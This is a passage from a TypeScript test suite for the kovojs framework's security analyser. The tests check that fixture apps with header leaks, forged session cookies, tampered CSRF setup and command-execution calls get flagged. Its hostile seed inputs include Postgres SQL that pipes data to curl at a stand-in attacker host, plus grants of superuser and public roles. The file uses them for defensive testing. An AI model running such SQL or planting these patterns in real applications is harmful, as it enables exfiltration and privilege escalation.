        page(_context, request) { return <Proof headers={request.headers} />; },
      });
    `);
    expect(aliasedComponentFacts, JSON.stringify(aliasedComponentFacts)).toEqual(
      expect.arrayContaining([expect.objectContaining({ sink: 'client-wire.request.headers' })]),
    );

    const customSlotChildrenLeak = sinksFor(`
      /** @jsxImportSource @kovojs/server */
      import { component } from '@kovojs/core';
      import { route } from '@kovojs/server';
      const Proof = component({
        render(_data, _state, slots) { return <main>{slots.children}</main>; },
      });
      route('/', {
        page(_context, request) {
          return <Proof>{request.headers.get('authorization')}</Proof>;
        },
      });
    `);
    expect(customSlotChildrenLeak, JSON.stringify(customSlotChildrenLeak)).toEqual(
      expect.arrayContaining([
        expect.objectContaining({ sink: 'client-wire.request.header.Authorization' }),
      ]),
    );

    for (const render of [
      `render(_data, _state, slots) {
        const alias = slots;
        alias.request.headers.set('x-proof', 'forged');
        return <main>closed</main>;
      }`,
      `render(_data, _state, slots) {
        const { ...rest } = slots;
        rest.request.headers.set('x-proof', 'forged');
        return <main>closed</main>;
      }`,
      `render(_data, _state, slots = {}) {
        slots.unknown();
        return <main>closed</main>;
      }`,
      `render(_data, _state, slots) {
        const alias = slots;
        alias.unknown();
        return <main>closed</main>;
      }`,
      `render(_data, _state, ...slots) {
        slots[0].unknown();
        return <main>closed</main>;
      }`,
    ]) {
      const facts = sinksFor(`
        /** @jsxImportSource @kovojs/server */
        import { component } from '@kovojs/core';
        import { route } from '@kovojs/server';
        const Proof = component({ ${render} });
        route('/', { page() { return <Proof />; } });
      `);
      expect(facts.length, render).toBeGreaterThan(0);
    }

    const dynamicNamespace = sinksFor(`
      /** @jsxImportSource @kovojs/server */
      import * as browserTrust from '@kovojs/browser';
      import { component } from '@kovojs/core';
      import { createApp, publicAccess, query, route } from '@kovojs/server';
      const contactsQuery = query({ load() { return { items: [] }; } });
      export const Proof = component({
        queries: { contacts: contactsQuery },
        render(data) { return <main>{browserTrust[data.key](data.contacts.items[0]?.email ?? '')}</main>; },
      });
      export default createApp({
        queries: [contactsQuery],
        routes: [route('/', { access: publicAccess('fixture'), page() { return <Proof />; } })],
      });
    `);
    expect(dynamicNamespace.length).toBeGreaterThan(0);

    for (const invoke of ["slots.runCommand('x');", "slots[data.method]('x');"]) {
      const hostileSlots = sinksFor(`
        /** @jsxImportSource @kovojs/server */
        import { component } from '@kovojs/core';
        import { createApp, publicAccess, route } from '@kovojs/server';
        const Proof = component({
          render(data, _state, slots) {
            ${invoke}
            return <main>closed slots</main>;
          },
        });
        export default createApp({
          routes: [route('/', { access: publicAccess('fixture'), page() { return <Proof />; } })],
        });
      `);
      expect(hostileSlots.length, invoke).toBeGreaterThan(0);
    }

    for (const poison of [
      'items.map = execFileSync;',
      "Object.defineProperty(items, 'map', { value: execFileSync });",
    ]) {
      const hostileArray = sinksFor(`
        /** @jsxImportSource @kovojs/server */
        import { execFileSync } from 'node:child_process';
        import { component } from '@kovojs/core';
        import { createApp, publicAccess, query, route } from '@kovojs/server';
        const contactsQuery = query({ load() { return { items: [] }; } });
        const Proof = component({
          queries: { contacts: contactsQuery },
          render({ contacts }) {
            const items = contacts.items;
            ${poison}
            return <ul>{items.map((contact) => <li>{contact.email}</li>)}</ul>;
          },
        });
        export default createApp({
          queries: [contactsQuery],
          routes: [route('/', { access: publicAccess('fixture'), page() { return <Proof />; } })],
        });
      `);
      expect(hostileArray.length, poison).toBeGreaterThan(0);
    }
  });

  it('accepts only the exact pristine Better Auth CSRF environment derivation grammar', () => {
    const exact = sinksFor(`
      import { betterAuthCsrfFromEnvironment } from '@kovojs/better-auth';
      import { createApp } from '@kovojs/server';
      const appCsrf = betterAuthCsrfFromEnvironment({
        field: 'csrf',
      });
      export default createApp({ csrf: appCsrf, routes: [] });
    `);
    expect(exact).toEqual([]);

    const variants = [
      `import { betterAuthCsrfFromEnvironment as deriveCsrf } from '@kovojs/better-auth';
       const appCsrf = deriveCsrf({ field: 'csrf', sessionId(request) { return request.id; } });`,
      `import * as auth from '@kovojs/better-auth';
       const appCsrf = auth.betterAuthCsrfFromEnvironment({ field: 'csrf', sessionId(request) { return request.id; } });`,
      `import { betterAuthCsrfFromEnvironment } from '@kovojs/better-auth';
       const appCsrf = betterAuthCsrfFromEnvironment({ ...{ field: 'csrf' }, sessionId(request) { return request.id; } });`,
      `import { betterAuthCsrfFromEnvironment } from '@kovojs/better-auth';
       const key = 'field';
       const appCsrf = betterAuthCsrfFromEnvironment({ [key]: 'csrf', sessionId(request) { return request.id; } });`,
      `import { betterAuthCsrfFromEnvironment } from '@kovojs/better-auth';
       const appCsrf = betterAuthCsrfFromEnvironment({ field: dynamicField, sessionId(request) { return request.id; } });`,
      `import { betterAuthCsrfFromEnvironment } from '@kovojs/better-auth';
       const appCsrf = betterAuthCsrfFromEnvironment({ field: 'csrf', extra: true, sessionId(request) { return request.id; } });`,
      `import { betterAuthCsrfFromEnvironment } from '@kovojs/better-auth';
       const appCsrf = betterAuthCsrfFromEnvironment({ field: 'csrf', field: 'again', sessionId(request) { return request.id; } });`,
      `import { betterAuthCsrfFromEnvironment } from '@kovojs/better-auth';
       const appCsrf = betterAuthCsrfFromEnvironment({ field: 'csrf', get sessionId() { return request => request.id; } });`,
      `import { betterAuthCsrfFromEnvironment } from '@kovojs/better-auth';
       Object.defineProperty(betterAuthCsrfFromEnvironment, 'call', { value() {} });
       const appCsrf = betterAuthCsrfFromEnvironment({ field: 'csrf', sessionId(request) { return request.id; } });`,
      `import { betterAuthCsrfFromEnvironment } from '@kovojs/better-auth';
       const appCsrf = betterAuthCsrfFromEnvironment({ field: 'other' });`,
      `import { betterAuthCsrfFromEnvironment } from '@kovojs/better-auth';
       const appCsrf = betterAuthCsrfFromEnvironment({ field: 'csrf', sessionId() { return 'global'; } });`,
      `import { betterAuthCsrfFromEnvironment } from '@kovojs/better-auth';
       const appCsrf = betterAuthCsrfFromEnvironment({ field: 'csrf', sessionId(request) { return request.headers.get('x-user'); } });`,
    ];
    for (const source of variants) {
      const facts = sinksFor(
        `import { createApp } from '@kovojs/server';\n${source}\nexport default createApp({ csrf: appCsrf, routes: [] });`,
      );
      expect(facts.length, source).toBeGreaterThan(0);
    }

    for (const sessionId of [
      `sessionId() { return 'global'; }`,
      `sessionId(request) { return request.headers.get('x-user'); }`,
    ]) {
      const facts = sinksFor(`
        import { betterAuthCsrfFromEnvironment } from '@kovojs/better-auth';
        import { createApp } from '@kovojs/server';
        const appCsrf = betterAuthCsrfFromEnvironment({ field: 'csrf', ${sessionId} });
        export default createApp({ csrf: appCsrf, routes: [] });
      `);
      expect(facts.length, sessionId).toBeGreaterThan(0);
    }
  });

  it('accepts only exact Better Auth environment binding option records', () => {
    const exactEnvironmentBindingFiles = [
      {
        fileName: 'schema.ts',
        source: `
          import { sqliteTable, text } from 'drizzle-orm/sqlite-core';
          export const user = sqliteTable('user', {
            email: text('email').notNull(),
            id: text('id').primaryKey(),
            name: text('name').notNull(),
          });
          export const authSchema = { user };
        `,
      },
      {
        fileName: '_kovo/app-runtime-db.ts',
        source: `
          import { createBetterAuthSqliteBindingsFromEnvironment } from '@kovojs/better-auth';
          import { createSqliteAppRuntime } from '@kovojs/server/sqlite';
          import { authSchema, user } from '../schema.js';
          const APP_TABLES = [user];
          const APP_SEED = [];
          const appDatabase = createSqliteAppRuntime({ seed: APP_SEED, tables: APP_TABLES });
          const authSystemDb = appDatabase.systemDb({
            operation: 'write', reason: 'auth', surface: 'fixture',
          });
          export const appRuntimeDbReady = appDatabase.ready;
          export function createAppAuthBindings(options) {
            return createBetterAuthSqliteBindingsFromEnvironment({
              csrf: options.csrf,
              mapSession: ({ session: authSession, user }) => ({
                id: authSession.id,
                user: { email: user.email, id: user.id, name: user.name },
              }),
              schema: authSchema,
              signInAccess: options.signInAccess,
              signOutAccess: options.signOutAccess,
              systemDb: authSystemDb,
            });
          }
        `,
      },
      {
        fileName: 'app.tsx',
        source: `
          import { authed, betterAuthCsrfFromEnvironment } from '@kovojs/better-auth';
          import { createApp, publicAccess, s, session } from '@kovojs/server';
          import { appRuntimeDbReady, createAppAuthBindings } from './_kovo/app-runtime-db.js';
          const appCsrf = betterAuthCsrfFromEnvironment({
            field: 'csrf',
          });
          const appAuthed = authed();
          const bindings = createAppAuthBindings({
            csrf: appCsrf,
            signInAccess: publicAccess('fixture'),
            signOutAccess: [appAuthed],
          });
          await appRuntimeDbReady;
          await bindings.seedDemoUser();
          const appSession = session(s.object({ id: s.string() }));
          export default createApp({
            routes: [],
            sessionProvider: appSession.provider(bindings.sessionProvider),
          });
        `,
      },
    ];
    const exact = sinksForFiles(exactEnvironmentBindingFiles);
    expect(exact).toEqual([]);

    const exactAuthoredProvider = sinksForFiles(
      exactEnvironmentBindingFiles.map((file) =>
        file.fileName === 'app.tsx'
          ? {
              ...file,
              source: file.source.replace(
                'appSession.provider(bindings.sessionProvider)',
                `appSession.provider(async (request) => {
                  if (request.headers.get('x-proof') === '1') {
                    return { setCookies: ['proof=1; Path=/'], value: { id: 'proof' } };
                  }
                  return bindings.sessionProvider(request);
                })`,
              ),
            }
          : file,
      ),
    );
    expect(exactAuthoredProvider).toEqual([]);

    for (const provider of [
      `appSession.provider(async (request) => {
        request = new Request('https://forged.invalid/', {
          headers: { cookie: request.headers.get('x-forged-cookie') ?? '' },
        });
        return bindings.sessionProvider(request);
      })`,
      `appSession.provider(async (request = new Request('https://forged.invalid/')) => {
        return bindings.sessionProvider(request);
      })`,
      `appSession.provider(async (...requests) => {
        return bindings.sessionProvider(requests[0]);
      })`,
      `appSession.provider(async (request) => {
        const forwarded = request;
        return bindings.sessionProvider(forwarded);
      })`,
      `appSession.provider(async (request) => {
        request.headers = new Headers();
        return bindings.sessionProvider(request);
      })`,
      `appSession.provider(async (request) => {
        const forged = request.headers.get('x-forged-cookie') ?? '';
        request.headers.set('cookie', forged);
        return bindings.sessionProvider(request);
      })`,
      `appSession.provider(async (request) => {
        const forged = request.headers.get('x-forged-cookie') ?? '';
        const headers = request.headers;
        headers.set('cookie', forged);
        return bindings.sessionProvider(request);
      })`,
    ]) {
      const facts = sinksForFiles(
        exactEnvironmentBindingFiles.map((file) =>
          file.fileName === 'app.tsx'
            ? {
                ...file,
                source: file.source.replace(
                  'appSession.provider(bindings.sessionProvider)',
                  provider,
                ),
              }
            : file,
        ),
      );
      expect(facts, provider).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            sink: 'request-handler.opaque-call',
          }),
        ]),
      );
    }

    const hostileAuthoredProvider = sinksForFiles(
      exactEnvironmentBindingFiles.map((file) =>
        file.fileName === 'app.tsx'
          ? {
              ...file,
              source: file.source
                .replace(
                  `import { createApp, publicAccess, s, session } from '@kovojs/server';`,
                  `import { createApp, publicAccess, s, session } from '@kovojs/server';\nimport { execFileSync } from 'node:child_process';`,
                )
                .replace(
                  'appSession.provider(bindings.sessionProvider)',
                  `appSession.provider(async (request) => {
                    execFileSync('provider-hostile');
                    return bindings.sessionProvider(request);
                  })`,
                ),
            }
          : file,
      ),
    );
    expect(hostileAuthoredProvider).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          sink: 'child_process.execFileSync',
          source: "'provider-hostile'",
        }),
      ]),
    );

    const exactPostgresFiles = [
      {
        fileName: 'schema.ts',
        source: `
          import { pgTable, text } from 'drizzle-orm/pg-core';
          export const user = pgTable('user', {
            email: text('email').notNull(), id: text('id').primaryKey(), name: text('name').notNull(),
          });
          export const authSchema = { user };
        `,
      },
      {
        fileName: '_kovo/app-runtime-db-options.ts',
        source: `
          import { postgresAppRuntimeOptions, postgresSchemaModule } from '@kovojs/server';
          import * as schema from '../schema.js';
          export const appRuntimeSchema = postgresSchemaModule(schema);
          const SEED_CONTACTS =
            'INSERT INTO contacts (id, name, email, company) VALUES ' +
            "('c1', 'Ada Lovelace', 'ada@example.com', 'Analytical Engines'), " +
            "('c2', 'Grace Hopper', 'grace@example.com', 'Naval Systems'), " +
            "('c3', 'Alan Turing', 'alan@example.com', 'Bletchley Park') " +
            'ON CONFLICT (id) DO NOTHING;';
          export const appRuntimeDbOptions = postgresAppRuntimeOptions({
            schema: appRuntimeSchema,
            seedSql: SEED_CONTACTS,
          });
        `,
      },
      {
        fileName: '_kovo/app-runtime-db.ts',
        source: `
          import { createBetterAuthPostgresBindingsFromEnvironment } from '@kovojs/better-auth';
          import { createPostgresAppRuntimeDb } from '@kovojs/server';
          import { appRuntimeDbOptions, appRuntimeSchema } from './app-runtime-db-options.js';
          const appDatabase = createPostgresAppRuntimeDb(appRuntimeDbOptions);
          const authSystemDb = appDatabase.systemDb({
            operation: 'write', reason: 'auth', surface: 'fixture',
          });
          export const appRuntimeDbReady = appDatabase.ready;
          export function createAppAuthBindings(options) {
            return createBetterAuthPostgresBindingsFromEnvironment({
              csrf: options.csrf,
              mapSession: ({ session: authSession, user }) => ({
                id: authSession.id,
                user: { email: user.email, id: user.id, name: user.name },
              }),
              schema: appRuntimeSchema.authSchema,
              signInAccess: options.signInAccess,
              signOutAccess: options.signOutAccess,
              systemDb: authSystemDb,
            });
          }
          export const appRuntimeDbProvider = appDatabase.db;
        `,
      },
      {
        fileName: 'app.tsx',
        source: `
          import { authed, betterAuthCsrfFromEnvironment } from '@kovojs/better-auth';
          import { createApp, publicAccess, s, session } from '@kovojs/server';
          import {
            appRuntimeDbProvider,
            appRuntimeDbReady,
            createAppAuthBindings,
          } from './_kovo/app-runtime-db.js';
          const appCsrf = betterAuthCsrfFromEnvironment({ field: 'csrf' });
          const appAuthed = authed();
          const bindings = createAppAuthBindings({
            csrf: appCsrf,
            signInAccess: publicAccess('fixture'),
            signOutAccess: [appAuthed],
          });
          await appRuntimeDbReady;
          await bindings.seedDemoUser();
          const appSession = session(s.object({ id: s.string() }));
          export default createApp({
            db: appRuntimeDbProvider,
            routes: [],
            sessionProvider: appSession.provider(bindings.sessionProvider),
          });
        `,
      },
    ];
    const exactPostgres = sinksForFiles(exactPostgresFiles);
    expect(exactPostgres).toEqual([]);

    const emptySeedPostgres = sinksForFiles(
      exactPostgresFiles.map((file) =>
        file.fileName === '_kovo/app-runtime-db-options.ts'
          ? { ...file, source: file.source.replace('seedSql: SEED_CONTACTS', 'seedSql: []') }
          : file,
      ),
    );
    expect(emptySeedPostgres).toEqual([]);

    const authoredSeedArray = sinksForFiles(
      exactPostgresFiles.map((file) =>
        file.fileName === '_kovo/app-runtime-db-options.ts'
          ? {
              ...file,
              source: file.source.replace(
                'seedSql: SEED_CONTACTS',
                "seedSql: ['SELECT current_user']",
              ),
            }
          : file,
      ),
    );
    expect(authoredSeedArray).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          sink: 'request-handler.opaque-call',
          source: 'createPostgresAppRuntimeDb',
        }),
      ]),
    );

    for (const [label, seedSequence] of [
      ['export alias', `export const appSeedDemoUser = bindings.seedDemoUser;`],
      [
        'call before ready',
        `await bindings.seedDemoUser();
         await appRuntimeDbReady;`,
      ],
      [
        'non-awaited call',
        `await appRuntimeDbReady;
         bindings.seedDemoUser();`,
      ],
      [
        'stored promise',
        `await appRuntimeDbReady;
         const seedResult = bindings.seedDemoUser();
         await seedResult;`,
      ],
      [
        'then callback',
        `await appRuntimeDbReady;
         await bindings.seedDemoUser().then(() => undefined);`,
      ],
      [
        'optional call',
        `await appRuntimeDbReady;
         await bindings.seedDemoUser?.();`,
      ],
      [
        'helper wrapper',
        `async function seedAtBoot() { await bindings.seedDemoUser(); }
         await appRuntimeDbReady;
         await seedAtBoot();`,
      ],
      [
        'nested block',
        `await appRuntimeDbReady;
         { await bindings.seedDemoUser(); }`,
      ],
      [
        'nested static block',
        `await appRuntimeDbReady;
         class SeedAtBoot { static { void bindings.seedDemoUser(); } }`,
      ],
      [
        'callback capture',
        `await appRuntimeDbReady;
         await [undefined].map(() => bindings.seedDemoUser())[0];`,
      ],
      [
        'destructured alias',
        `const { seedDemoUser } = bindings;
         await appRuntimeDbReady;
         await seedDemoUser();`,
      ],
      [
        'repeated call',
        `await appRuntimeDbReady;
         await bindings.seedDemoUser();
         await appRuntimeDbReady;
         await bindings.seedDemoUser();`,
      ],
    ] as const) {
      const facts = sinksForFiles(
        exactPostgresFiles.map((file) =>
          file.fileName === 'app.tsx'
            ? {
                ...file,
                source: file.source.replace(
                  `await appRuntimeDbReady;
          await bindings.seedDemoUser();`,
                  seedSequence,
                ),
              }
            : file,
        ),
      );
      expect(
        facts.some(
          (fact) =>
            fact.source?.includes('seedDemoUser') === true ||
            fact.source?.includes('bindings') === true ||
            fact.source === '<opaque-retained-config-derivation>',
        ),
        label,
      ).toBe(true);
    }

    for (const hostileSeed of [
      `COPY (SELECT current_user) TO PROGRAM 'curl https://attacker.invalid'`,
      `CREATE FUNCTION steal() RETURNS void LANGUAGE plpgsql SECURITY DEFINER AS 'BEGIN END'`,
      `CREATE EXTENSION file_fdw`,
      `GRANT kovo_system TO public`,
      `ALTER ROLE kovo_app WITH SUPERUSER`,
    ]) {
      const facts = sinksForFiles(
        exactPostgresFiles.map((file) =>
          file.fileName === '_kovo/app-runtime-db-options.ts'
            ? {
                ...file,
                source: file.source.replace(
                  /const SEED_CONTACTS =[\s\S]*?;\n          export const appRuntimeDbOptions/u,
                  `const SEED_CONTACTS = ${JSON.stringify(hostileSeed)};\n          export const appRuntimeDbOptions`,
                ),
              }
            : file,
        ),
      );
      expect(facts, hostileSeed).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            sink: 'request-handler.opaque-call',
            source: 'createPostgresAppRuntimeDb',
          }),
        ]),
      );
    }

    // SPEC.md §6.6: exact AST provenance must be lost when generated Postgres options or their
    // nested Drizzle schema cross an unreviewed carrier before createPostgresAppRuntimeDb.
    for (const [label, escape] of [
      [
        'object holder',
        `const escaped = { value: appRuntimeSchema };
         escaped.value.authSchema.user = undefined;`,
      ],
      [
        'array holder',
        `const escaped = [appRuntimeDbOptions];
         escaped[0].schema.authSchema.user = undefined;`,
      ],
      [
        'getter return',
        `class Holder { get value() { return appRuntimeSchema; } }
         new Holder().value.authSchema.user = undefined;`,
      ],
      [
        'generator return',
        `function* values() { yield appRuntimeDbOptions; }
         values().next().value.schema.authSchema.user = undefined;`,
      ],
      [
        'helper return',
        `function getOptions() { return appRuntimeDbOptions; }
         getOptions().schema.authSchema.user = undefined;`,
      ],
      [
        'callback capture',
        `const escaped = [appRuntimeSchema].map((value) => value)[0];
         escaped.authSchema.user = undefined;`,
      ],
      [
        'static class field',
        `class Holder { static value = appRuntimeSchema; }
         Holder.value.authSchema.user = undefined;`,
      ],
      [
        'instance class field',
        `class Holder { value = appRuntimeDbOptions; }
         new Holder().value.schema.authSchema.user = undefined;`,
      ],
      [
        'constructor argument',
        `class Box { constructor(value) { this.value = value; } }
         const escaped = new Box(appRuntimeSchema);
         escaped.value.authSchema.user = undefined;`,
      ],
    ] as const) {
      const facts = sinksForFiles(
        exactPostgresFiles.map((file) =>
          file.fileName === '_kovo/app-runtime-db.ts'
            ? {
                ...file,
                source: file.source.replace(
                  `const appDatabase = createPostgresAppRuntimeDb(appRuntimeDbOptions);`,
                  `${escape}
                   const appDatabase = createPostgresAppRuntimeDb(appRuntimeDbOptions);`,
                ),
              }
            : file,
        ),
      );
      expect(facts, label).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            sink: 'request-handler.opaque-call',
            source: 'createPostgresAppRuntimeDb',
          }),
        ]),
      );
    }

    const exportedSchemaCarrier = sinksForFiles(
      exactPostgresFiles.map((file) => {
        if (file.fileName === '_kovo/app-runtime-db-options.ts') {
          return { ...file, source: `${file.source}\nexport default appRuntimeSchema;` };
        }
        if (file.fileName === '_kovo/app-runtime-db.ts') {
          return {
            ...file,
            source: file.source
              .replace(
                `import { appRuntimeDbOptions, appRuntimeSchema } from './app-runtime-db-options.js';`,
                `import escapedSchema, { appRuntimeDbOptions, appRuntimeSchema } from './app-runtime-db-options.js';`,
              )
              .replace(
                `const appDatabase = createPostgresAppRuntimeDb(appRuntimeDbOptions);`,
                `escapedSchema.authSchema.user = undefined;
                 const appDatabase = createPostgresAppRuntimeDb(appRuntimeDbOptions);`,
              ),
          };
        }
        return file;
      }),
    );
    expect(exportedSchemaCarrier).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          sink: 'request-handler.opaque-call',
          source: 'createPostgresAppRuntimeDb',
        }),
      ]),
    );

    const jsxSchemaCarrier = sinksForFiles([
      ...exactPostgresFiles.map((file) =>
        file.fileName === '_kovo/app-runtime-db.ts'
          ? {
              ...file,
              source: file.source
                .replace(
                  `import { appRuntimeDbOptions, appRuntimeSchema } from './app-runtime-db-options.js';`,
                  `import { appRuntimeDbOptions, appRuntimeSchema } from './app-runtime-db-options.js';
                   import { escapedSchema } from './schema-carrier.js';`,
                )
                .replace(
                  `const appDatabase = createPostgresAppRuntimeDb(appRuntimeDbOptions);`,
                  `escapedSchema.props.value.authSchema.user = undefined;
                   const appDatabase = createPostgresAppRuntimeDb(appRuntimeDbOptions);`,
                ),
            }
          : file,
      ),
      {
        fileName: '_kovo/schema-carrier.tsx',
        source: `
          import { appRuntimeSchema } from './app-runtime-db-options.js';
          function Carrier(props) { return props.value; }
          export const escapedSchema = <Carrier value={appRuntimeSchema} />;
        `,
      },
    ]);
    expect(jsxSchemaCarrier).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          sink: 'request-handler.opaque-call',
          source: 'createPostgresAppRuntimeDb',
        }),
      ]),
    );

    const requestDerivedFactoryOptions = sinksForFiles([
      ...exactEnvironmentBindingFiles.filter(({ fileName }) => fileName !== 'app.tsx'),
      {
        fileName: 'unsafe.ts',
        source: `
          import { mutation, publicAccess } from '@kovojs/server';
          import { createAppAuthBindings } from './_kovo/app-runtime-db.js';
          export const unsafe = mutation({
            access: publicAccess('fixture'),
            handler(input) {
              const bindings = createAppAuthBindings({
                csrf: input.csrf,
                signInAccess: input.signInAccess,
                signOutAccess: input.signOutAccess,
              });
              return bindings.sessionProvider;
            },
          });
        `,
      },
    ]);
    expect(requestDerivedFactoryOptions).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          sink: 'request-handler.opaque-source',
          source: '<request-scoped-framework-setup>',
        }),
      ]),
    );

    const requestScopedStaticSetup = sinksForFiles(
      exactEnvironmentBindingFiles.map((file) =>
        file.fileName === 'app.tsx'
          ? {
              ...file,
              source: file.source
                .replace(
                  `createApp, publicAccess, s, session`,
                  `createApp, mutation, publicAccess, s, session`,
                )
                .replace(
                  `export default createApp({`,
                  `export const unsafeSeed = mutation({
                    access: publicAccess('fixture'),
                    handler() { return bindings.seedDemoUser(); },
                  });
                  export const unsafeBindings = mutation({
                    access: publicAccess('fixture'),
                    handler() {
                      return createAppAuthBindings({
                        csrf: appCsrf,
                        signInAccess: publicAccess('fixture'),
                        signOutAccess: [appAuthed],
                      });
                    },
                  });
                  export default createApp({`,
                ),
            }
          : file,
      ),
    );
    expect(
      requestScopedStaticSetup.filter(({ source }) => source === '<request-scoped-framework-setup>')
        .length,
      JSON.stringify(requestScopedStaticSetup),
    ).toBeGreaterThanOrEqual(1);
    expect(requestScopedStaticSetup).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          sink: 'request-handler.opaque-call',
          source: 'bindings.seedDemoUser',
        }),
      ]),
    );

    for (const [label, mutateApp] of [
      [
        'wrong csrf origin',
        (source: string) =>
          source.replace(
            `const appCsrf = betterAuthCsrfFromEnvironment({\n            field: 'csrf',\n          });`,
            `const appCsrf = { field: 'csrf' };`,
          ),
      ],
      [
        'aliased csrf binding',
        (source: string) =>
          source
            .replace(
              `const appAuthed = authed();`,
              `const csrfAlias = appCsrf;\n          const appAuthed = authed();`,
            )
            .replace(`csrf: appCsrf,`, `csrf: csrfAlias,`),
      ],
      [
        'wrong authed origin',
        (source: string) => source.replace(`const appAuthed = authed();`, `const appAuthed = {};`),
      ],
      [
        'aliased authed binding',
        (source: string) =>
          source
            .replace(
              `const appAuthed = authed();`,
              `const appAuthed = authed();\n          const authedAlias = appAuthed;`,
            )
            .replace(`signOutAccess: [appAuthed],`, `signOutAccess: [authedAlias],`),
      ],
    ] as const) {
      const facts = sinksForFiles(
        exactEnvironmentBindingFiles.map((file) =>
          file.fileName === 'app.tsx' ? { ...file, source: mutateApp(file.source) } : file,
        ),
      );
      expect(facts.length, label).toBeGreaterThan(0);
    }

    for (const setup of [
      `import { createBetterAuthPostgresBindingsFromEnvironment as construct } from '@kovojs/better-auth';`,
      `import * as auth from '@kovojs/better-auth'; const construct = auth.createBetterAuthPostgresBindingsFromEnvironment;`,
    ]) {
      const facts = sinksFor(`
        ${setup}
        import { createApp } from '@kovojs/server';
        const bindings = construct({
          csrf: {}, mapSession: value => value, schema: {},
          signInAccess: {}, signOutAccess: {}, systemDb: {},
        });
        export default createApp({ routes: [], sessionProvider: bindings.sessionProvider });
      `);
      expect(facts.length, setup).toBeGreaterThan(0);
    }

    for (const [unsafeName, exactLine, unsafeLine] of [
      ['csrf', `csrf: options.csrf,`, `csrf: {},`],
      ['schema', `schema: authSchema,`, `schema: {},`],
      ['signInAccess', `signInAccess: options.signInAccess,`, `signInAccess: {},`],
      ['signOutAccess', `signOutAccess: options.signOutAccess,`, `signOutAccess: [],`],
      ['systemDb', `systemDb: authSystemDb,`, `systemDb: {},`],
    ] as const) {
      const files = exactEnvironmentBindingFiles.map((file) =>
        file.fileName === '_kovo/app-runtime-db.ts'
          ? { ...file, source: file.source.replace(exactLine, unsafeLine) }
          : file,
      );
      const facts = sinksForFiles(files);
      expect(facts, `${unsafeName}: ${unsafeLine}`).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            sink: 'request-handler.opaque-call',
            source: 'createBetterAuthSqliteBindingsFromEnvironment',
          }),
        ]),
      );
    }

    const wrapperSideEffect = sinksForFiles(
      exactEnvironmentBindingFiles.map((file) =>
        file.fileName === 'app.tsx'
          ? {
              ...file,
              source: file.source
                .replace(
                  `import { createApp, publicAccess, s, session } from '@kovojs/server';`,
                  `import { createApp, publicAccess, s, session } from '@kovojs/server';\n          import { execFileSync } from 'node:child_process';`,
                )
                .replace(
                  `const bindings = createAppAuthBindings({`,
                  `function makeBindings() {\n            execFileSync('binding-wrapper');\n            return createAppAuthBindings({`,
                )
                .replace(
                  `signOutAccess: [appAuthed],\n          });`,
                  `signOutAccess: [appAuthed],\n            });\n          }`,
                )
                .replace(
                  `appSession.provider(bindings.sessionProvider)`,
                  `appSession.provider(makeBindings().sessionProvider)`,
                ),
            }
          : file,
      ),
    );
    expect(wrapperSideEffect).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          sink: 'request-handler.opaque-source',
          source: '<opaque-retained-config-derivation>',
        }),
      ]),
    );
  }, 60_000);

  it('accepts only an exact module-local memory webhook replay store retained by webhook', () => {
    const source = ({
      declaration = 'const memoryReplay = createMemoryWebhookReplayStore();',
      extra = '',
      replayProperty = 'replayStore: memoryReplay,',
    }: {
      declaration?: string;
      extra?: string;
      replayProperty?: string;
    } = {}) => `
      import {
        createMemoryWebhookReplayStore,
        publicAccess,
        s,
        webhook,
      } from '@kovojs/server';
      ${declaration}
      ${extra}
      export const hook = webhook('/webhooks/memory', {
        access: publicAccess('memory replay classifier fixture'),
        handler() { return { ok: true }; },
        idempotency(input) { return input.id; },
        input: s.object({ id: s.string() }),
        ${replayProperty}
        verify: 'none',
        verifyJustification: 'memory replay classifier fixture',
      });
    `;

    // SPEC §6.6 / §9.1: this is a classifier exception for exact framework config, not a
    // production-durability exemption. The normal production policy still rejects volatile truth.
    expect(sinksFor(source())).toEqual([]);

    for (const [label, candidate] of [
      [
        'inline constructor',
        source({
          declaration: '',
          replayProperty: 'replayStore: createMemoryWebhookReplayStore(),',
        }),
      ],
      [
        'exported binding',
        source({ declaration: 'export const memoryReplay = createMemoryWebhookReplayStore();' }),
      ],
      ['export list', source({ extra: 'export { memoryReplay };' })],
      [
        'alias',
        source({
          extra: 'const alias = memoryReplay;',
          replayProperty: 'replayStore: alias,',
        }),
      ],
      ['member mutation', source({ extra: 'memoryReplay.get = async () => undefined;' })],
      [
        'reflective mutation',
        source({
          extra: `Object.defineProperty(memoryReplay, 'get', { value: async () => undefined });`,
        }),
      ],
      [
        'constructor options',
        source({
          declaration: 'const memoryReplay = createMemoryWebhookReplayStore({ maxEntries: 10 });',
        }),
      ],
      [
        'Function.call constructor',
        source({
          declaration: 'const memoryReplay = createMemoryWebhookReplayStore.call(undefined);',
        }),
      ],
      [
        'computed retention',
        source({
          extra: `const replayKey = 'replayStore';`,
          replayProperty: '[replayKey]: memoryReplay,',
        }),
      ],
      ['wrong retention field', source({ replayProperty: 'mutationReplayStore: memoryReplay,' })],
    ] as const) {
      expect(sinksFor(candidate), label).not.toEqual([]);
    }
  });

  it('accepts the exact generated durable Postgres webhook replay-store grammar', () => {
    const files = [
      {
        fileName: 'schema.ts',
        source: `
          import { pgTable, text } from 'drizzle-orm/pg-core';
          export const contacts = pgTable('contacts', { id: text('id').primaryKey() });
        `,
      },
      {
        fileName: '_kovo/app-runtime-db-options.ts',
        source: `
          import { postgresAppRuntimeOptions, postgresSchemaModule } from '@kovojs/server';
          import * as schema from '../schema.js';
          export const appRuntimeSchema = postgresSchemaModule(schema);
          const SEED_CONTACTS =
            'INSERT INTO contacts (id, name, email, company) VALUES ' +
            "('c1', 'Ada Lovelace', 'ada@example.com', 'Analytical Engines'), " +
            "('c2', 'Grace Hopper', 'grace@example.com', 'Naval Systems'), " +
            "('c3', 'Alan Turing', 'alan@example.com', 'Bletchley Park') " +
            'ON CONFLICT (id) DO NOTHING;';
          export const appRuntimeDbOptions = postgresAppRuntimeOptions({
            schema: appRuntimeSchema,
            seedSql: SEED_CONTACTS,
          });
        `,
      },
      {
        fileName: '_kovo/app-runtime-db.ts',
        source: `
